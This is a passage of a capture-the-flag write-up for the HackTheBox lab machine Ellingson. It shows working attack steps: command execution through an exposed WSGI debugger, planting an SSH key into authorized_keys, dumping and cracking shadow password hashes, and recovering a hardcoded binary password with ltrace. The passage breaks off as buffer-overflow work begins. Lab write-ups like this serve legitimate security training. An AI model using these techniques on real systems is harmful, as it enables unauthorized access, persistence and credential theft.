I"M\<h1 id="htb-ellingson-101010139">HTB Ellingson (10.10.10.139)</h1>

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 15000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.139
<span class="go">
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.139
<span class="go">
  PORT   STATE SERVICE VERSION
</span><span class="gp">  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">  | ssh-hostkey: 
  |   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
  |   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
  |_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  | http-title: Ellingson Mineral Corp
  |_Requested resource was http://10.10.10.139/index
</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
</span></code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<p><img src="./screenshots/32_ellingson/80_landing_page.png" alt="Landing Page" /></p>

<p>The landing page leads to a website for <span style="color:red">Ellingson Mineral Corp</span> which includes three articles and the faces behind the Company (Hal, Margo, Eugene, and Duke). This is clearly a reference to the 1995 film, <a href="https://en.wikipedia.org/wiki/Hackers_(film)">Hackers</a>.</p>

<p><img src="./screenshots/32_ellingson/80_article_3.png" alt="Suspicious Network activity" /></p>

<p>One of the articles posted is entitled “Suspicious Network activity” where it writes:</p>

<blockquote>
  <p>We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague</p>
</blockquote>

<p>The articles are accessed throught the <strong><code class="highlighter-rouge">/articles</code></strong> directory then followed by an <strong>id</strong> or <strong>index</strong> (e.g. <strong><code class="highlighter-rouge">/articles/3</code></strong>).</p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<p><img src="./screenshots/32_ellingson/80_wsgi_error.png" alt="builtins.IndexError" /></p>

<p>Attempting to load a non-existent article using an <strong><em>index</em></strong> that is too large or too small redirects the user to a <span style="color:orange">WSGI error page</span>. WSGI (Web Server Gateway Interface) serves as a middleware that handles requests between the web server and the web application.</p>

<p><img src="./screenshots/32_ellingson/80_wsgi_rce.png" alt="RCE" /></p>

<p>The error page can also serve as an interactive debugger which you can leverage for command execution. Maybe this could be used to gain a reverse shell or plant an <strong><em>RSA public key</em></strong> to gain persistent access over <strong><em>ssh</em></strong>.</p>

<hr />

<h2 id="part-4--generate-user-shell-hal">PART 4 : GENERATE USER SHELL (hal)</h2>

<p>Using the command execution over the WSGI debugger:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"cat /etc/passwd | egrep -e *sh$"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>

  <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">theplague</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Eugene</span> <span class="n">Belford</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">theplague</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">hal</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hal</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">margo</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1002</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">margo</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">duke</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1003</span><span class="p">:</span><span class="mi">1003</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">duke</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"ls -lah /home/hal"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>

  <span class="n">total</span> <span class="mi">36</span><span class="n">K</span>
  <span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">5</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="o">.</span>
  <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">..</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">220</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bash_logout</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">3.7</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bashrc</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">cache</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">gnupg</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">807</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">profile</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">ssh</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">865</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">viminfo</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"echo -e '</span><span class="se">\n</span><span class="s">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf5LWxsMSacl9zZMA02V7umX21MZ/eIhYCS+iwa9coGiOEWsHO8h2iuDTrOPlg4HSlYx7pgkBe0oPHyorSLYXWHiXQyYqgcS60f1KTmd18hdo15YVReSgk4ZUM7t4j8rj/QqLiypb0cRJMGClWotbNr8UzaYvytl1X0t6z0LVAvC0VHNVqBi/FPjYVrn184ddP0uh1BKDPp2kPvE4Xlnm6D7jUXr72q/kEhB5EbnNNRBi6Dy1gMPQQQTUh1pI4M3yIbAyWvNS6SvLhIOqh76v7cQPI+aX557I+epxxT2B+RsQYW4TjA4fvvAQyktlL39dXzdDn2AXiVyVHDEL68uoMxwbRaz2aGhq0R0l7KZoHqd4sDda8U8vSPTEyofjPDXRUQWYBDsfpn1JHm+bvjXhCli2Mjgwc+Ep0jwSB8oJCiP5l7fi90VmbqKKYKQxLE1oEGBCHfZnNvl6oMnp8nzwUJDtO22yutNggIHeHh8SkVcrdlApospeKIRFTlAOrvyE= root@kali' &gt;&gt; /home/hal/.ssh/authorized_keys"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>
</code></pre></div></div>

<p>Now that a public key has been added to <strong><em>.ssh/authorized_keys</em></strong>, attempt to login via ssh using an identity file:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa <span class="nt">-l</span> hal 10.10.10.139
<span class="go">
</span><span class="gp">hal@ellingson:~$</span><span class="w">  </span><span class="nb">id</span>
<span class="go">
  uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)

</span></code></pre></div></div>

<p>The user, <strong><code class="highlighter-rouge">hal</code></strong>, is also part of the <strong><code class="highlighter-rouge">4(adm)</code></strong> group.</p>

<hr />

<h2 id="part-5--lateral-movement-hal---margo">PART 5 : LATERAL MOVEMENT (hal -&gt; margo)</h2>

<p>While inside <strong><code class="highlighter-rouge">hal</code></strong>’s shell:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>find /var <span class="nt">-gid</span> 4 2&gt;/dev/null
<span class="go">
  /var/backups/shadow.bak
  ...omitted...

</span><span class="gp">hal@ellingson:~$</span><span class="w">  </span><span class="nb">cat</span> /var/backups/shadow.bak
<span class="go">
  root:*:17737:0:99999:7:::
  ...omitted...
</span><span class="gp">  theplague:$</span>6<span class="nv">$.</span>5ef7Dajxto8Lz3u<span class="nv">$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj</span>/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
<span class="gp">  hal:$</span>6<span class="nv">$UYTy</span>.cHj<span class="nv">$qGyl</span>.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
<span class="gp">  margo:$</span>6<span class="nv">$Lv8rcvK8$la</span>/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
<span class="gp">  duke:$</span>6<span class="nv">$bFjry0BT$OtPFpMfL</span>/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
<span class="go">
</span></code></pre></div></div>

<p>The <strong><code class="highlighter-rouge">adm</code></strong> group has read permissions for the <strong><code class="highlighter-rouge">shadow.bak</code></strong> file stored in <strong><code class="highlighter-rouge">/var/backups</code></strong>. It contains password hashes for all the members of the <strong><em>Ellingson</em></strong> team.</p>

<p>In the movie referenced by the box, Margo Wallace failed to change her password according to a schedule and her password coincidentally was “GOD” which according to Plague was one of the most commonly used passwords (along with Love, Sex, and Secret) which resulted in their system to be compromised.</p>

<p>Cracking Margo’s password hash is probably the next step forward:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="se">\$</span>6<span class="se">\$</span>Lv8rcvK8<span class="se">\$</span>la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1 <span class="o">&gt;</span> margo_hash
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/share/wordlists/rockyou.txt | egrep <span class="nt">-ie</span> <span class="s2">"^.*g[o0]d.*$"</span> <span class="o">&gt;</span> wordlist_god
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>wordlist_god margo_hash
<span class="go">
</span><span class="gp">  iamgod$</span>08        <span class="o">(</span>?<span class="o">)</span>
<span class="go">
</span></code></pre></div></div>

<p>Since <strong><em>SHA512 crypt</em></strong> hashes takes a while to crack, limiting the size of the wordlist is recommended. Also, since there is a context on what Margo’s password might be, I created a subset of <strong>rockyou.txt</strong> to only include passwords that contains variations of the string <strong>god</strong>. The cracked password serves as both UNIX and SSH credentials for the user, <strong><code class="highlighter-rouge">margo</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>su margo
<span class="gp">Password: iamgod$</span>08
<span class="go">
</span><span class="gp">margo@ellingson:/home/hal$</span><span class="w">  </span><span class="nb">id</span>
<span class="go">
  uid=1002(margo) gid=1002(margo) groups=1002(margo)

</span><span class="gp">margo@ellingson:/home/hal$</span><span class="w">  </span><span class="nb">cd</span> ~
<span class="go">
</span><span class="gp">margo@ellingson:~$</span><span class="w">  </span><span class="nb">ls</span> <span class="nt">-lah</span>
<span class="go">
  total 52K
  drwxrwx--- 6 margo margo 4.0K Mar 10  2019 .
  drwxr-xr-x 6 root  root  4.0K Mar  9  2019 ..
  -rw-r--r-- 1 margo margo  220 Mar  9  2019 .bash_logout
  -rw-r--r-- 1 margo margo 3.7K Mar  9  2019 .bashrc
  drwx------ 2 margo margo 4.0K Mar 10  2019 .cache
  drwx------ 3 margo margo 4.0K Mar 10  2019 .gnupg
  drwxrwxr-x 3 margo margo 4.0K Mar 10  2019 .local
  -rw-r--r-- 1 margo margo  807 Mar  9  2019 .profile
  drwx------ 2 margo margo 4.0K Mar  9  2019 .ssh
  -r-------- 1 margo margo   33 Mar 10  2019 user.txt
  -rw------- 1 margo margo 9.4K Mar 10  2019 .viminfo

</span><span class="gp">margo@ellingson:~$</span><span class="w">  </span><span class="nb">cat </span>user.txt
<span class="go">
  d0ff........................5903

</span></code></pre></div></div>

<hr />

<h2 id="part-6--privilege-escalation-margo---root">PART 6 : PRIVILEGE ESCALATION (margo -&gt; root)</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>find /bin /usr/bin <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">
  ...omitted...
  /usr/bin/garbage
  ...omitted...

</span></code></pre></div></div>

<p>Attempting to run the binary as another user (aside from margo) would return the following message:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
  User is not authorized to access this application. This attempt has been logged.

</span></code></pre></div></div>

<p>Otherwise:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
</span><span class="gp">  Enter access password: iamgodod$</span>08
<span class="go">
  access denied.

</span></code></pre></div></div>

<p>Check the program flow (i.e. syscalls, function arguments, signals) using <strong><code class="highlighter-rouge">ltrace</code></strong>. The password comparison might just be done using <strong><code class="highlighter-rouge">strcmp()</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>ltrace /usr/bin/garbage
<span class="go">
  getuid()                                                        = 1002
</span><span class="gp">  syslog(6, "user: %lu cleared to access this"..., 1002)          = &lt;void&gt;</span><span class="w">
</span><span class="go">  getpwuid(1002, 0x7a0030, 0x7a0010, 1)                           = 0x7f1052bf2f20
  strcpy(0x7ffe34be6a44, "margo")                                 = 0x7ffe34be6a44
  printf("Enter access password: ")                               = 23
  gets(0x7ffe34be69e0, 0x7a1b90, 0, 0Enter access password: 
  )                            = 0x7ffe34be69e0
  putchar(10, 0x7a1fa0, 0x7f1052bf28d0, 0x7f1052915081
  )           = 10
  strcmp("", "N3veRF3@r1iSh3r3!")                                 = -78
  puts("access denied."access denied.
  )                                          = 15
</span><span class="gp">  exit(-1 &lt;no return ...&gt;</span><span class="w">
</span><span class="go">  +++ exited (status 255) +++

</span></code></pre></div></div>

<p>Aaaaaand the password checking is indeed done by using <strong><code class="highlighter-rouge">strcmp("", "N3veRF3@r1iSh3r3!")</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
  Enter access password: N3veRF3@r1iSh3r3!

  access granted.
  [+] W0rM || Control Application
  [+] ---------------------------
  Select Option
  1: Check Balance
  2: Launch
  3: Cancel
  4: Exit
</span><span class="gp">  &gt;</span><span class="w"> </span>1
<span class="gp">  Balance is $</span>1337
<span class="gp">  &gt;</span><span class="w"> </span>2
<span class="go">  Row Row Row Your Boat...
</span><span class="gp">  &gt;</span><span class="w"> </span>3
<span class="go">  The tankers have stopped capsizing
</span><span class="gp">  &gt;</span><span class="w"> </span>4
<span class="go">
</span></code></pre></div></div>

<p>Trying to access the <strong><code class="highlighter-rouge">garbage</code></strong> binary again with the right password leads to a control panel and all options just outputs a string and are not interactive. If this were a buffer overflow vulnerability, then the only attack vectors left are the <strong><em>password input</em></strong> and the <strong><em>option selection input</em></strong>.</p>

<p>Now, it’s time to save the binary locally and attempt to create an exploit:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>scp margo@10.10.10.139:/usr/bin/garbage ./garbage
<span class="gp">$</span><span class="w"> </span>margo@10.10.10.139<span class="s1">'s password: iamgod$08
</span><span class="go">
  garbage                                                                100%

</span><span class="gp">$</span><span class="w"> </span>file ./garbage
</code></pre></div></div>

:ET